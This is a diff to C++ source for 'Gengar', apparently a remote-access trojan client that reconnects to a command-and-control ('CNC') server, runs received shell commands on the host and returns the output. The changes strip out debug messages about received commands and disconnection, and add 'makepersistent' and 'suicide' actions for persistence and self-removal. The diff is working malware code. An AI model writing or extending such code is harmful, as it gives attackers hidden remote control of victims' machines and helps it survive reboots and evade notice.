@@ -1,6 +1,17 @@
 #include <iostream>
 #include "gengar.h"
 
+bool IsEqual(std::string str1, std::string str2)
+{
+	size_t len1 = str1.length();
+	size_t len2 = str2.length();
+
+	if (len1 > len2)
+		return str1.substr(0, len2) == str2;
+	else
+		return str2.substr(0, len1) == str1;
+}
+
 void Gengar::ListenForCommand()
 {
 	char type_content_delimiter = ':';
@@ -10,7 +21,6 @@ void Gengar::ListenForCommand()
 		try
 		{
 			std::string input = m_client.Receive();
-			std::cout << "Received command: " << input << std::endl;
 			size_t delimiter_index = input.find(type_content_delimiter);
 
 			if (delimiter_index == std::string::npos)
@@ -20,32 +30,42 @@ void Gengar::ListenForCommand()
 			else
 			{
 				std::string type = input.substr(0, delimiter_index);
-				std::string content = input.substr(delimiter_index + 1, input.size());
+				std::string content = input.substr(delimiter_index + 1, std::string::npos);
 				RouteCommand(type, content);
 			}
 		}
 		catch (boost::system::system_error&)
 		{
-			std::cout << "Disconnected from CNC." << std::endl;
 			ConnectToCnc();
 			ListenForCommand();
 		}
 	}
 }
 
+
 void Gengar::RouteCommand(std::string& type, std::string& content)
 {
 	std::string output;
+
 	if (type == "shell")
 	{
-		output = m_machine.RunShellCommand(content);
+		output = m_machine.RunShellCommand(std::move(content));
 	}
-	else
+	else if (type == "action")
 	{
-		output = "Unknown command type. Ignoring.\n";
+		if (IsEqual(content, "makepersistent"))
+		{
+			m_machine.MakePersistent();
+			output = "Gengar is now persistent.";
+		}
+		else if (IsEqual(content, "suicide"))
+		{
+			m_machine.Suicide();
+		}
 	}
 	m_client.Send(std::move(output));
 }
+
 
 void Gengar::ConnectToCnc()
 {
